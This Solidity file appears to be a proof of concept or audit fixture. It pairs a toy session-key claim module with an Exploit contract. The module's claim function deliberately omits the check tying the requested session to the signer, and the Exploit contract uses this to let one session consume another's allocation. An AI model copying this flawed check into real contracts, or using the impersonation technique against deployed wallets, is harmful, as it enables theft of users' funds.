// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SessionClaimModule {
    mapping(address => address) public sessionWallet;
    mapping(address => bool) public claimed;

    function enable(address sessionKey, address wallet) external {
        sessionWallet[sessionKey] = wallet;
    }

    function claim(address sessionKeySigner, address requestedSession, address wallet) external {
        require(sessionWallet[sessionKeySigner] == wallet, "signer not wallet session");
        require(!claimed[requestedSession], "already claimed");
        // @> VULN: the requested session is not required to equal the signer.
        claimed[requestedSession] = true;
    }
}

contract Exploit {
    SessionClaimModule public module;
    address public constant SESSION_ONE = address(0x1001);
    address public constant SESSION_TWO = address(0x1002);
    address public constant WALLET = address(0xBEEF);
    bool public impersonated;

    constructor() {
        module = new SessionClaimModule();
    }

    function run() external {
        module.enable(SESSION_ONE, WALLET);
        module.enable(SESSION_TWO, WALLET);
        // Session TWO signs, but the call consumes SESSION ONE's allocation.
        module.claim(SESSION_TWO, SESSION_ONE, WALLET);
        impersonated = module.claimed(SESSION_ONE) && !module.claimed(SESSION_TWO);
        require(impersonated, "cross-session claim failed");
    }
}
